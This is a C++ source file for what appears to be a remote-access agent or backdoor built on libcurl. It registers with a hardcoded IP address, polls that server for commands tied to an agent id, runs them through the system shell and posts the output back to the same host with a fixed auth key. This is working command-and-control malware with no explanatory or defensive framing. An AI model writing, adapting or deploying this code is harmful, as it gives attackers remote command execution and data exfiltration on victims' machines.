#include "../headers/connection_handler.h"

size_t http::write_function(void* arg_ptr, size_t arg_size, size_t arg_nmemb, std::string* arg_data)
{
	arg_data->append((char*)arg_ptr, arg_size * arg_nmemb);
	return arg_size * arg_nmemb;
}

void http::init(std::string arg_info)
{
	//init
	curl_global_init(CURL_GLOBAL_ALL);

	struct curl_httppost* formpost = NULL;
	struct curl_httppost* lastptr = NULL;
	struct curl_slist* headerlist = curl_slist_append(NULL, "Expect:");
	curl_formadd(&formpost, &lastptr, CURLFORM_COPYNAME, "data", CURLFORM_COPYCONTENTS, arg_info.c_str(), CURLFORM_END);
	CURL* curli = curl_easy_init();

	if (curli)
	{
		curl_easy_setopt(curli, CURLOPT_URL, "http://176.57.184.19/parser");
		curl_easy_setopt(curli, CURLOPT_HTTPHEADER, headerlist);
		curl_easy_setopt(curli, CURLOPT_HTTPPOST, formpost);

		CURLcode res = curl_easy_perform(curli);

		curl_easy_cleanup(curli);
		curl_formfree(formpost);
		curl_slist_free_all(headerlist);
	}
}

std::string http::get(std::string arg_target_id)
{
	//get command
	std::string final_url = "http://176.57.184.19/getagentcommands?id=" + arg_target_id;

	auto curlg = curl_easy_init();
	if (curlg) {
		curl_easy_setopt(curlg, CURLOPT_URL, final_url.c_str());

		std::string response_string;
		std::string header_string;
		curl_easy_setopt(curlg, CURLOPT_WRITEFUNCTION, write_function);
		curl_easy_setopt(curlg, CURLOPT_WRITEDATA, &response_string);
		curl_easy_setopt(curlg, CURLOPT_HEADERDATA, &header_string);

		char* url;
		long response_code;
		double elapsed;
		curl_easy_getinfo(curlg, CURLINFO_EFFECTIVE_URL, &url);

		curl_easy_perform(curlg);
		curl_easy_cleanup(curlg);
		curlg = NULL;
		return response_string;
	}
}

std::string http::ssystem(const char* arg_command)
{
	char temporary_name[L_tmpnam];
	std::tmpnam(temporary_name);
	std::string scommand = arg_command;
	std::string cmd = scommand + " >> " + temporary_name;
	std::system(cmd.c_str());
	std::ifstream file(temporary_name, std::ios::in | std::ios::binary);
	std::string result;
	if (file) {
		while (!file.eof()) result.push_back(file.get())
			;
		file.close();
	}
	remove(temporary_name);
	return result;
}

std::string http::execute_command(std::string arg_command)
{
	std::string bash = arg_command;
	std::string in;
	std::string s = ssystem(bash.c_str());
	std::istringstream iss(s);
	std::string line;
	std::string full_data;

	while (std::getline(iss, line))
	{
		full_data = full_data + line + "\n";
	}

	return full_data;
}

void http::post_response(std::string arg_return_string, std::string arg_target_id)
{
	std::string key = "abc123";
	std::string free_store_data = "http://176.57.184.19/free_Data";

	//send command data
	curl_global_init(CURL_GLOBAL_ALL);

	struct curl_httppost* form = NULL;
	struct curl_httppost* last = NULL;
	struct curl_slist* header = curl_slist_append(NULL, "Expect:");

	curl_formadd(&form, &last, CURLFORM_COPYNAME, "auth", CURLFORM_COPYCONTENTS, key.c_str(), CURLFORM_END);
	curl_formadd(&form, &last, CURLFORM_COPYNAME, "data", CURLFORM_COPYCONTENTS, execute_command(arg_return_string).c_str(), CURLFORM_END);
	curl_formadd(&form, &last, CURLFORM_COPYNAME, "agent", CURLFORM_COPYCONTENTS, arg_target_id.c_str(), CURLFORM_END);

	CURL* curl = curl_easy_init();

	if (curl)
	{
		curl_easy_setopt(curl, CURLOPT_URL, free_store_data.c_str());
		curl_easy_setopt(curl, CURLOPT_HTTPHEADER, header);
		curl_easy_setopt(curl, CURLOPT_HTTPPOST, form);

		CURLcode res = curl_easy_perform(curl);

		curl_easy_cleanup(curl);
		curl_formfree(form);
		curl_slist_free_all(header);
	}
}


std::string http::uuid_as_id()
{
	std::stringstream ss;
	int i;
	ss << std::hex;
	for (i = 0; i < 8; i++) {
		ss << dis(gen);
	}
	ss << "-";
	for (i = 0; i < 4; i++) {
		ss << dis(gen);
	}
	ss << "-4";
	for (i = 0; i < 3; i++) {
		ss << dis(gen);
	}
	return ss.str();
}